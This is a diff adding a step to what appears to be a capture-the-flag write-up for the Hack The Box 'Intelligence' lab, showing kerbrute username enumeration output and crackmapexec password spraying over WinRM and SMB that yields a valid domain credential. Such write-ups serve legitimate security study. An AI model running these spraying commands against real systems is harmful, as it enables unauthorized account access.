@@ -291,6 +291,21 @@ sudo ./kerbrute_linux_amd64 userenum --dc 10.10.10.248 -d intelligence.htb -o ke
 2024/06/23 15:16:25 >  [+] VALID USERNAME:       Travis.Evans@intelligence.htb
 ```
 
+Used `crackmapexec` to see what users could be used with the passowrd `NewIntelligenceCorpUser9876`:
+
+```bash
+# failed
+crackmapexec winrm 10.10.10.248 -u userlist -p 'NewIntelligenceCorpUser9876'
+
+# success
+crackmapexec smb 10.10.10.248 -u userlist -p 'NewIntelligenceCorpUser9876'
+
+SMB         10.10.10.248    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876
+```
+
+
+
+
 
 
 
